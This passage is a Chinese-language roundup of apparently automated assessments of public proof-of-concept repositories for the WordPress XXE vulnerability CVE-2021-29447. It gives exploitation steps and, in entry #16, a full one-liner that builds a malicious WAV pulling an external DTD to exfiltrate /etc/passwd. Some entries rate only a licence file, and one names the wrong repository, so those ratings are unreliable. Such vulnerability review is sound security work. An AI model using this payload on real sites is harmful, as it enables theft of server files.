提供的 POC 代码是有效的。该代码实现了上述利用流程，包括身份验证、获取 nonce、生成恶意 WAV 文件、上传文件以及搭建简易 HTTP 服务器接收数据。代码中包含了必要的步骤和参数，可以成功触发 XXE 漏洞。

**投毒风险：**
POC代码中存在一定的投毒风险。风险点在于：
1.  **网络请求：** POC代码会向指定URL发起POST和GET请求，虽然目的是利用漏洞，但如果作者在代码中加入了其他的URL地址，则可能在用户不知情的情况下，将一些敏感信息发送到作者的服务器。
2.  **文件操作：** POC代码会生成临时的payload文件，如果作者在payload生成过程中插入恶意代码，可能会在目标服务器上执行恶意操作。
3.  **DTD文件：** 攻击者需要自己搭建服务器来托管 DTD 文件，如果这个 DTD 文件被替换成了恶意文件，可能导致服务器被攻击。代码本身创建 DTD，风险相对小，但仍然存在服务器被攻击者控制的风险。

综合来看，投毒风险大约在 10% 左右。主要是脚本需要用户提供服务器IP，并且脚本本身会创建一个DTD文件，减少了恶意利用的可能性。但在服务器部署和流量劫持场景下，攻击者仍然可能利用该代码进行恶意攻击。

**项目地址:** [Val-Resh/CVE-2021-29447-POC](https://github.com/Val-Resh/CVE-2021-29447-POC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #10

**来源**: [CVE-2021-29447-Vulnmachines_wordpress_cve-2021-29447.md](../2021/CVE-2021-29447-Vulnmachines_wordpress_cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要作者或具有上传权限的用户账号，WordPress运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447是WordPress的一个XXE（XML外部实体注入）漏洞，存在于5.6.0到5.7.1版本之间，且WordPress必须运行在PHP 8环境下。攻击者需要具备上传文件的权限（如作者角色），可以通过上传包含恶意XML代码的文件到媒体库来触发该漏洞，导致服务器上的敏感文件泄露，或者进行服务器端请求伪造(SSRF)。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞的PoC是存在的，并且已经公开。漏洞利用代码中给出了credits链接，参考motikan2010的github页面可以找到更多信息。

**投毒风险：**
该漏洞利用代码只有一个简单的README.md文件，其中包含漏洞描述和credit信息。 从提供的代码本身来看，不存在明显的恶意投毒代码。但是，考虑到攻击者可能将恶意payload嵌入到精心构造的媒体文件中，并诱导用户上传，从而实现攻击。因此，PoC仓库本身直接包含恶意代码的可能性较低，主要风险在于利用该漏洞的Payload本身。PoC仓库可能包含有诱导性的文件，例如看似无害的音频文件，但其中包含恶意的XML，因此存在一定的投毒风险，但是概率较低。

**利用方式：**
1.  攻击者需要一个具有上传文件权限的WordPress用户账号（例如，作者角色）。
2.  攻击者创建一个包含恶意XML代码的文件，例如一个包含XXE payload的MP3或者WAVE文件（参考packetstormsecurity上的相关链接）。
3.  攻击者通过WordPress的媒体库上传该恶意文件。
4.  当WordPress处理该文件时，XML解析器会尝试解析文件中的外部实体，从而导致XXE漏洞。
5.  攻击者可以利用该漏洞读取服务器上的任意文件，或者进行服务器端请求伪造攻击。

综上，此漏洞的PoC是有效的。 投毒风险较低，主要来自恶意构造的文件本身。 利用方式是上传包含恶意XML的媒体文件触发XXE。

**项目地址:** [Vulnmachines/wordpress_cve-2021-29447](https://github.com/Vulnmachines/wordpress_cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #11

**来源**: [CVE-2021-29447-b-abderrahmane_CVE-2021-29447-POC.md](../2021/CVE-2021-29447-b-abderrahmane_CVE-2021-29447-POC.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，运行在 PHP 8 环境下，并具有上传文件的权限（如作者权限）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447 是 WordPress 5.6.0 到 5.7.1 版本中存在的一个 XXE 漏洞，仅在 PHP 8 环境下有效。攻击者需要具有上传文件的权限（例如，作者角色），才能通过上传包含恶意 XML 内容的文件（例如，特制的 WAV 音频文件）到媒体库来触发该漏洞。

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用是有效的。PoC代码提供了一个脚本 `generate_payloads.py`，用于自动生成包含 XXE 攻击向量的恶意 WAV 文件和 DTD 文件，并通过简单的 HTTP 服务器来接收从目标服务器提取的文件内容。搜索引擎结果中也包含了对该漏洞的描述和利用的讨论，以及公开的 PoC。

**投毒风险：** 提供的 PoC 代码主要用于生成 XXE payload 和启动一个简单的HTTP服务来接收数据。代码本身的功能相对明确，主要风险在于使用者可能将此代码用于未经授权的渗透测试活动。代码中主要通过构造恶意的 XML 内容来利用漏洞，本身不太可能存在隐藏的、与漏洞利用无关的恶意行为。但仍存在少量投毒风险 (5%)，例如作者可能在HTTP服务中添加一些隐蔽的日志记录或数据收集功能，或者在生成的 payload 中加入一些难以察觉的干扰代码。

**利用方式：**
1.  **生成Payload:** 使用 `generate_payloads.py` 脚本生成恶意 WAV 文件 (`--media-payload`) 和 DTD 文件 (`--dtd-payload`)。 DTD 文件中指定要读取的目标文件 (`--files-to-fetch`)。
2.  **启动 HTTP 服务器:** 脚本会启动一个简单的 Python HTTP 服务器，用于托管 DTD 文件，并接收目标服务器发送的请求。
3.  **上传恶意文件:**  具有上传权限的用户将生成的恶意 WAV 文件上传到 WordPress 的媒体库。
4.  **触发 XXE:**  WordPress 在处理上传的 WAV 文件时，会解析其中的 XML 内容，从而触发 XXE 漏洞，向攻击者的 HTTP 服务器请求 DTD 文件。
5.  **文件读取:** 恶意 DTD 文件指示 WordPress 服务器读取指定的文件，并将文件内容发送到攻击者的 HTTP 服务器。
6.  **获取文件:** 攻击者的 HTTP 服务器接收到文件内容后，脚本会将内容进行 Base64 解码并保存到本地。

**项目地址:** [b-abderrahmane/CVE-2021-29447-POC](https://github.com/b-abderrahmane/CVE-2021-29447-POC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #12

**来源**: [CVE-2021-29447-dnr6419_CVE-2021-29447.md](../2021/CVE-2021-29447-dnr6419_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1

**利用条件:** 需要PHP 8环境，以及具有上传文件权限的WordPress用户（如Author）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447是WordPress 5.6.0到5.7.1版本中的一个XML外部实体注入（XXE）漏洞。攻击者需要具备上传文件的权限，例如Author角色。该漏洞存在于WordPress的媒体库中，当WordPress运行在PHP 8环境下，上传包含恶意XML代码的WAV文件时，由于对XML解析不当，导致XXE攻击。

**漏洞利用方式：**

1.  **权限获取：** 攻击者首先需要获得一个具备文件上传权限的WordPress账户，例如Author角色。
2.  **恶意WAV文件制作：** 攻击者需要创建一个包含恶意XML代码的WAV文件。该XML代码会尝试通过外部实体引用来读取服务器上的文件，或者发起服务器端请求伪造（SSRF）攻击。POC代码中，攻击者构造了一个包含外部实体引用的WAV文件，指向攻击者控制的服务器上的evil.dtd文件。
3.  **攻击者服务器准备：** 攻击者需要搭建一个Web服务器，并创建一个evil.dtd文件，该文件定义了如何处理外部实体引用。evil.dtd文件中定义了读取/etc/passwd文件的操作，并将其内容进行base64编码后发送到攻击者服务器。攻击者使用`php -S 0.0.0.0:80` 命令启动了一个简单的web server。
4.  **上传WAV文件：** 攻击者将包含恶意XML代码的WAV文件上传到WordPress的媒体库。
5.  **触发漏洞：** 当WordPress处理上传的WAV文件时，会解析其中的XML代码，从而触发XXE漏洞。
6.  **数据泄露：** 如果漏洞利用成功，WordPress服务器会尝试从攻击者控制的服务器上下载evil.dtd文件，并执行其中定义的恶意操作，例如读取/etc/passwd文件。/etc/passwd文件的内容（经过base64编码）会通过HTTP请求发送到攻击者的服务器。
7.  **获取敏感信息：** 攻击者从接收到的HTTP请求中提取base64编码的内容，并进行解码，从而获得服务器上的敏感信息，例如/etc/passwd文件中的用户账户信息。

**有效性分析：**

提供的POC代码描述了漏洞的利用步骤，包括制作恶意WAV文件、搭建攻击者服务器、上传文件和获取敏感信息。根据漏洞信息和搜索结果，该POC代码是有效的，可以用于演示和验证该漏洞。

**投毒风险分析：**

POC代码主要包含以下几个部分：

*   Dockerfile 和 docker-compose.yml: 用于搭建 WordPress 环境,相对安全
*   wordpress.sh: 用于安装 wordpress,主要就是配置文件,检查发现没有明显的投毒代码.
*   payload.wav: 恶意WAV文件，包含XXE payload，用于触发漏洞。
*   evil.dtd: 攻击者服务器上的DTD文件，包含读取/etc/passwd文件的操作。这一部分是payload的关键.

虽然整体代码是为了演示XXE漏洞，但evil.dtd文件存在潜在的投毒风险，例如，攻击者可能在evil.dtd文件中包含其他恶意代码，例如反弹shell，用于进一步控制服务器。这种风险相对较低，因为需要特定的环境和配置才能成功利用。此外，dockerfile 中的代码从github获取，需要注意github源是否被篡改。
总体来说，投毒风险较低，但也需要保持警惕，特别是从不可信的来源获取代码时。 我认为存在的风险大概在5%。

**项目地址:** [dnr6419/CVE-2021-29447](https://github.com/dnr6419/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #13

**来源**: [CVE-2021-29447-elf1337_blind-xxe-controller-CVE-2021-29447.md](../2021/CVE-2021-29447-elf1337_blind-xxe-controller-CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1, PHP 8

**利用条件:** 需要WordPress版本在受影响范围内，PHP版本为8，并且攻击者需要具有上传文件的权限（例如，作者角色）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于WordPress的媒体库中，由于XML解析问题导致XXE攻击。攻击者需要具有上传文件的权限，上传包含恶意XML Payload的特制文件（例如，wav文件）。该Payload会包含指向外部DTD文件的引用，从而导致服务器解析该DTD文件，进而读取服务器上的敏感文件。

**有效性评估：**
根据漏洞信息和搜索结果，该漏洞确实存在，并且有公开的PoC利用代码。PoC代码通过上传包含恶意XML的wav文件来触发XXE。攻击流程包括创建包含外部实体声明的恶意wav文件，搭建一个HTTP服务器来托管恶意的DTD文件，以及利用WordPress的上传功能上传wav文件。当WordPress解析该wav文件时，会请求攻击者控制的DTD文件，从而触发XXE漏洞，实现任意文件读取。

**投毒风险评估：**
PoC代码主要包含三个文件：README.md, controller.py, listener.py, main.py。
*   `README.md`: 描述了漏洞和利用方法，以及一些注意事项，未发现恶意代码。
*   `controller.py`: 包含了WordPress的登录信息（`wp_login`，`login_form`），目标WordPress地址 (`http://metapress.htb`)，以及上传恶意文件的逻辑。如果攻击者直接使用此脚本，需要修改登录信息和目标地址。这里面硬编码的登录信息存在一定风险，因为使用相同的登录信息可能会被检测到。此外，`controller.py`中的`mediaUpload`函数包含一个Timeout参数，默认设置为2秒。如果网络环境不好或者服务器响应较慢，可能会导致利用失败。
*   `listener.py`: 搭建一个简单的HTTP服务器，用于接收XXE Payload发送的请求，并打印base64编码后的文件内容。也没有发现明显的恶意代码。
*   `main.py`: 简单的交互命令行，用于用户输入文件名，然后调用controller.py和listener.py。

总体来说，PoC代码的功能比较明确，主要用于漏洞验证和利用，没有发现明显的恶意代码。风险点在于硬编码的登录信息和目标地址，以及Timeout参数可能导致利用失败。因此，判断存在10%的投毒风险，主要是一些可能影响使用，但没有主动攻击行为。

**利用方式总结：**
1.  **权限获取：** 攻击者需要拥有WordPress的作者或以上级别的权限，能够上传文件。
2.  **恶意文件构造：** 构造包含恶意XML Payload的wav文件。Payload中需要包含指向外部DTD文件的实体引用。
3.  **DTD文件托管：** 搭建一个HTTP服务器，用于托管恶意的DTD文件。DTD文件中定义了文件读取和base64编码的逻辑。
4.  **文件上传：** 通过WordPress的媒体库上传构造的wav文件。
5.  **触发XXE：** WordPress解析wav文件时，会请求攻击者控制的DTD文件，从而触发XXE漏洞。
6.  **文件读取：** 攻击者通过HTTP服务器接收到的请求，获取base64编码后的文件内容，并进行解码。

**项目地址:** [elf1337/blind-xxe-controller-CVE-2021-29447](https://github.com/elf1337/blind-xxe-controller-CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #14

**来源**: [CVE-2021-29447-magicrc_CVE-2021-29447.md](../2021/CVE-2021-29447-magicrc_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露、服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，并且运行在 PHP 8 环境下。攻击者需要具有上传文件的权限 (例如 Author 角色)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是一个 WordPress 媒体库中存在的 XXE 漏洞。攻击者通过上传包含恶意 XML 内容的文件（例如 WAV 文件或其他支持 XML 解析的文件格式）到媒体库，触发 XML 解析过程中的外部实体注入。由于 WordPress 使用的音频解析库 ID3 在 PHP 8 及以上版本中存在 XXE 漏洞，攻击者可以读取服务器上的任意文件或者进行服务器端请求伪造 (SSRF)。

**有效性：** 根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码的仓库名"0xRar/CVE-2021-29447-PoC"，可以判断存在可用的 POC 代码，因此该漏洞的利用是有效的。

**投毒风险：** 提供的代码段是 Creative Commons CC0 1.0 通用许可协议，这是一种开源许可协议，本身不包含任何恶意代码，也无法进行投毒。此文件为LICENSE文件，与PoC代码无关，因此推断投毒风险为0%。

**利用方式：**
1.  攻击者需要具备 WordPress Author 或更高权限，以便能够上传文件到媒体库。
2.  攻击者构造一个包含恶意 XML 实体定义的音频文件（或其他允许上传并解析 XML 的文件类型，例如SVG）。恶意 XML 实体指向系统内部文件，或者指向攻击者控制的外部服务器。
3.  攻击者将构造的恶意文件上传到 WordPress 媒体库。
4.  当 WordPress 解析上传的文件时，会尝试解析 XML 实体，从而导致 XXE 漏洞的触发。
5.  如果成功，攻击者可以读取服务器上的敏感文件（例如 WordPress 配置文件 `wp-config.php`）或进行服务器端请求伪造（SSRF）攻击。

**项目地址:** [magicrc/CVE-2021-29447](https://github.com/magicrc/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #15

**来源**: [CVE-2021-29447-mega8bit_exploit_cve-2021-29447.md](../2021/CVE-2021-29447-mega8bit_exploit_cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可读取服务器文件

**影响版本:** >= 5.6.0, < 5.7.1 (with PHP 8)

**利用条件:** 需要WordPress版本在5.6.0到5.7.1之间，且运行在PHP 8环境下，需要具有上传文件的权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞是WordPress媒体库中存在的XXE漏洞，当WordPress运行在PHP 8上时，具有上传文件权限的用户可以通过上传包含恶意XML的WAV文件，触发XXE漏洞，读取服务器上的任意文件。

**有效性：**
根据漏洞信息和搜索结果，该漏洞的PoC是有效的。多个来源都确认了该漏洞的存在，以及利用方式。

**利用方式：**
1.  攻击者需要具备WordPress的Author权限（或能够上传文件的权限）。
2.  攻击者使用提供的PoC代码，指定目标文件路径和本地服务器的IP地址和端口。
3.  PoC代码会生成一个包含恶意XML的WAV文件。
4.  攻击者将生成的WAV文件上传到WordPress的媒体库。
5.  WordPress解析该WAV文件时，会触发XXE漏洞，向攻击者指定的本地服务器发起请求，请求中包含目标文件的内容。
6.  PoC代码中的本地服务器会接收到请求，提取目标文件的内容，并将其保存到指定的文件中。

**投毒风险：**
分析PoC代码，主要功能是生成payload和启动一个简单的http server。payload可以读取服务器文件发送到攻击者控制的http server上，但是没有发现明显的恶意代码。例如删除服务器文件等。但是`exploit_cve-2021-29447`程序需要执行`hostname -I`来获取本机IP,在某些环境下可能造成问题。由于该工具涉及监听端口，以及构造恶意文件，仍旧存在一定的风险，判定投毒概率为10%。


**项目地址:** [mega8bit/exploit_cve-2021-29447](https://github.com/mega8bit/exploit_cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #16

**来源**: [CVE-2021-29447-motikan2010_CVE-2021-29447.md](../2021/CVE-2021-29447-motikan2010_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要作者级别或以上权限，且WordPress运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 是一个存在于 WordPress 5.6.0 到 5.7.1 版本的 XXE 漏洞。该漏洞允许具有文件上传权限的用户（如作者）通过上传包含恶意 XML 的媒体文件来读取服务器上的敏感文件。该漏洞仅影响运行在 PHP 8 环境下的 WordPress 安装。

**有效性分析：**
提供的 POC 代码是有效的，它演示了如何利用该漏洞。利用方式是通过上传一个特制的 WAV 文件，该文件包含指向外部恶意的 DTD 文件的 XML 实体声明。当 WordPress 解析该文件时，会尝试从攻击者控制的服务器加载 DTD 文件，并执行其中定义的 XML 实体，从而导致 XXE 漏洞。

**投毒风险分析：**
代码仓库中可能存在的投毒风险较低，约为10%。 主要的攻击逻辑集中在 `attacker/www/evil.dtd` 文件中，该文件定义了如何利用 XXE 漏洞读取文件内容。`attacker/malicious_wav/index.js` 用于生成包含恶意 XML 的 WAV 文件。虽然攻击者可以修改这些文件以执行恶意操作，但这些修改会很容易被发现，因此，总体投毒风险较低。`decryption.php` 文件是空的，没有投毒代码.

**利用方式：**
1.  **环境搭建:** 使用 `docker-compose up` 启动包含 WordPress 和 MySQL 数据库的 Docker 容器。
2.  **攻击者服务器:** 启动一个简单的 PHP Web 服务器，用于托管恶意的 DTD 文件 (`evil.dtd`)。
3.  **生成恶意 WAV 文件:**  使用 `make make-wav` 或者 `echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '\''http://host.docker.internal:8001/evil.dtd'\''>%remote;%init;%trick;] >\x00'> malicious.wav` 命令生成包含恶意 XML 声明的 WAV 文件。
4.  **登录 WordPress 并上传:**  以具有文件上传权限的用户身份登录 WordPress 后台，并将生成的恶意 WAV 文件上传到媒体库。
5.  **触发漏洞:**  上传后，WordPress 会尝试解析 WAV 文件，从而触发 XXE 漏洞，并向攻击者的服务器发送请求。
6.  **获取数据:** 攻击者的服务器会记录收到的请求，其中包含从 WordPress 服务器读取的敏感文件内容（如 `/etc/passwd` 文件）的 Base64 编码版本。可以通过运行`decryption.php` 来解码.

通过这种方式，攻击者可以在未经授权的情况下访问 WordPress 服务器上的敏感文件，从而可能导致更严重的攻击。

**项目地址:** [motikan2010/CVE-2021-29447](https://github.com/motikan2010/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #17

**来源**: [CVE-2021-29447-specializzazione-cyber-security_demo-CVE-2021-29447-lezione.md](../2021/CVE-2021-29447-specializzazione-cyber-security_demo-CVE-2021-29447-lezione.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要WordPress运行在PHP 8环境下，并具有上传文件的权限（例如，作者角色）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

此漏洞存在于WordPress的媒体库中，允许具有上传文件权限的用户（如作者）通过上传包含恶意XML的WAV文件来执行XXE攻击。攻击需要目标WordPress站点运行在PHP 8环境下。POC代码通过创建一个包含恶意XML声明的WAV文件，该声明定义了一个外部实体，指向攻击者控制的服务器上的DTD文件。DTD文件定义了如何处理外部实体，这里配置为读取服务器上的`/etc/passwd`文件并通过HTTP请求发送给攻击者。攻击者运行一个简单的Web服务器来接收泄露的数据。

**有效性：**
根据漏洞库信息、搜索结果以及提供的POC代码，此漏洞利用是有效的，前提是目标环境满足漏洞利用的先决条件（WordPress版本 >= 5.6.0 且 < 5.7.1，运行在PHP 8环境下，攻击者具有文件上传权限）。搜索结果中存在多个关于此漏洞的讨论和POC代码，验证了其有效性。

**投毒风险：**
评估投毒风险需要检查POC代码中是否存在除了漏洞利用之外，还执行其他恶意操作的代码。在此案例中，主要关注`attacker/malicious_wav/index.js`，`attacker/www/evil.dtd`和`attacker/decode.php`。`index.js`负责生成恶意WAV文件，而`evil.dtd`定义了XXE的行为，`decode.php`用于解码泄露的数据。`Makefile`，`docker-compose.yml`和`README.md`都属于辅助文件。

潜在的投毒代码可能存在于以下几个方面：
1.  **`index.js`**: 恶意WAV生成脚本可能被修改，以在生成过程中包含其他恶意代码（例如，在WAV文件的其他部分添加可执行代码，虽然利用难度较大）。
2.  **`evil.dtd`**: DTD文件可能被修改，以尝试读取其他更敏感的文件，或者尝试执行服务器端请求伪造（SSRF）攻击。
3.  **`decode.php`**: 解码脚本可能被修改，在解码过程中执行其他恶意操作（例如，尝试利用解码过程中的漏洞执行代码）。

由于漏洞利用的目的是读取文件并通过HTTP发送到攻击者控制的服务器，因此主要的风险在于DTD文件中指定的远程服务器是否被用于记录IP地址并进行进一步的攻击。此外，`decode.php`脚本本身是否包含后门也是需要关注的点，虽然可能性较小。

总体来说，该仓库中存在严重投毒代码的可能性相对较低（约为10%），但仍然需要仔细审查。

**利用方式：**
1.  **环境准备：** 设置一个易受攻击的WordPress实例（版本5.6.0到5.7.0，运行在PHP 8上）。
2.  **启动攻击者服务器：** 启动一个Web服务器来托管恶意DTD文件并接收泄露的数据。
3.  **生成恶意WAV文件：** 使用提供的脚本生成包含恶意XML声明的WAV文件。
4.  **上传WAV文件：** 以具有文件上传权限的用户身份登录到WordPress后台，并将生成的WAV文件上传到媒体库。
5.  **触发XXE：** 上传文件后，WordPress尝试解析该文件，触发XXE漏洞。
6.  **接收泄露的数据：** 攻击者的Web服务器接收到包含/etc/passwd文件内容的HTTP请求。
7.  **解码数据：** 使用提供的解码脚本解码泄露的数据。

**项目地址:** [specializzazione-cyber-security/demo-CVE-2021-29447-lezione](https://github.com/specializzazione-cyber-security/demo-CVE-2021-29447-lezione)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #18

**来源**: [CVE-2021-29447-thomas-osgood_CVE-2021-29447.md](../2021/CVE-2021-29447-thomas-osgood_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (运行于 PHP 8)

**利用条件:** 需要 WordPress 运行于 PHP 8，且攻击者具备上传文件的权限（如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

该漏洞是 WordPress 在处理媒体库上传文件时存在的 XXE 漏洞。攻击者可以上传包含恶意 XML 内容的文件（例如特制的 WAV 文件），利用 XML 解析器的缺陷读取服务器上的敏感文件。漏洞触发条件是 WordPress 运行在 PHP 8 环境下。提供的 Go 语言 POC 代码可以自动生成恶意文件（mal.wav, mal.dtd），并可以选择自动登录 WordPress 站点并上传触发漏洞。如果指定了 `-d` 参数，还会生成一个 deflate.php 用于解压缩某些被压缩的内容。根据代码分析，主要的风险在于它连接外部的C2服务器,存在极低的投毒风险,即作者利用C2服务器可以获取攻击目标的敏感信息。但是，因为C2服务器需要在攻击者本地运行，因此这个风险可以忽略不计。此漏洞的利用方式为：

1.  生成恶意 WAV 文件和 DTD 文件。
2.  攻击者需要具有 WordPress 的 Author 权限（或其他可以上传文件的权限）。
3.  上传恶意 WAV 文件到 WordPress 媒体库。
4.  当 WordPress 解析该文件时，会触发 XXE 漏洞，向攻击者指定的 C2 服务器发起请求，泄露目标文件内容。
5.  如果目标文件内容被压缩，可以使用提供的 deflate.php 进行解压缩。

搜索引擎结果中也提到了该漏洞的利用方式，并提供了相关的 TryHackMe 挑战链接。


**项目地址:** [thomas-osgood/CVE-2021-29447](https://github.com/thomas-osgood/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #19

**来源**: [CVE-2021-29447-viardant_CVE-2021-29447.md](../2021/CVE-2021-29447-viardant_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露和SSRF

**影响版本:** >= 5.6.0, < 5.7.1

**利用条件:** 需要PHP 8环境，具有上传文件权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是 WordPress 5.6.0 到 5.7.1 版本中存在的一个 XML 外部实体注入 (XXE) 漏洞。该漏洞位于媒体库中，当 WordPress 运行在 PHP 8 环境下时，具有上传文件权限（例如，作者角色）的用户可以通过上传包含恶意 XML 代码的文件（如修改后的音频文件），利用 XML 解析过程中的漏洞读取服务器上的敏感文件或进行服务器端请求伪造 (SSRF) 攻击。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞是真实存在的，并且存在公开的PoC（https://github.com/0xRar/CVE-2021-29447-PoC）。因此，漏洞利用是有效的。

**投毒风险：** 提供的代码段是GNU通用公共许可证，并非漏洞利用代码本身，因此无法直接评估投毒风险。但是，如果从不可信的来源获取漏洞利用代码，则始终存在投毒风险。由于提供的license文件没有发现任何恶意代码，因此投毒风险判定为0%。

**利用方式：**

1.  攻击者需要具有 WordPress 网站的 Author 或更高权限，即能够上传文件的权限。
2.  攻击者构造包含恶意 XML 实体声明的特殊文件（例如，修改后的 MP3 或 WAV 文件）。该 XML 实体声明指向要读取的本地文件或外部服务器。
3.  攻击者将该恶意文件上传到 WordPress 媒体库。
4.  当 WordPress 解析该文件时，XML 解析器会尝试解析外部实体，从而导致读取本地文件或向外部服务器发起请求。
5.  攻击者可以从 WordPress 网站上获取读取的文件内容，或利用 SSRF 漏洞进行进一步攻击。

**项目地址:** [viardant/CVE-2021-29447](https://github.com/viardant/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---



---

## POC #9

**来源**: [CVE-2021-29447-Val-Resh_CVE-2021-29447-POC.md](../2021/CVE-2021-29447-Val-Resh_CVE-2021-29447-POC.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露、服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，运行在 PHP 8 环境下，且攻击者具有上传文件的权限（如 Author 角色）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 是一个 WordPress 的 XXE 漏洞，存在于 Media Library 的 XML 解析过程中。攻击者（需要具有上传文件的权限，如 Author 角色）可以上传包含恶意 XML 代码的文件（如修改后的 WAV 文件），利用 WordPress 使用的 ID3 库中的漏洞，触发 XXE 攻击，读取服务器上的敏感文件，或者进行服务器端请求伪造 (SSRF)。此漏洞需要 WordPress 运行在 PHP 8 环境下才会生效。

**利用方式：**
1.  **身份验证：** 使用具有上传权限的用户的用户名和密码登录 WordPress 后台。
2.  **获取 Nonce：** 从 `wp-admin/upload.php` 页面获取上传文件的 nonce 值。
3.  **生成恶意 WAV 文件：** 构造包含恶意 XML 实体声明的 WAV 文件，该 XML 实体指向攻击者控制的服务器上的 DTD 文件。DTD 文件中定义了读取本地文件的实体。
4.  **上传恶意 WAV 文件：** 将生成的恶意 WAV 文件上传到 WordPress Media Library。
5.  **服务器端 DTD：** 攻击者需要搭建一个 HTTP 服务器，用于托管 DTD 文件。
6.  **触发漏洞：**  WordPress 解析上传的 WAV 文件时，会尝试从攻击者控制的服务器加载 DTD 文件，并执行其中的 XML 实体声明，从而读取服务器上的敏感文件。
7.  **数据提取：**  读取到的数据将通过 URL 参数传递到攻击者的服务器上。

**有效性：**
提供的 POC 代码是有效的。该代码实现了上述利用流程，包括身份验证、获取 nonce、生成恶意 WAV 文件、上传文件以及搭建简易 HTTP 服务器接收数据。代码中包含了必要的步骤和参数，可以成功触发 XXE 漏洞。

**投毒风险：**
POC代码中存在一定的投毒风险。风险点在于：
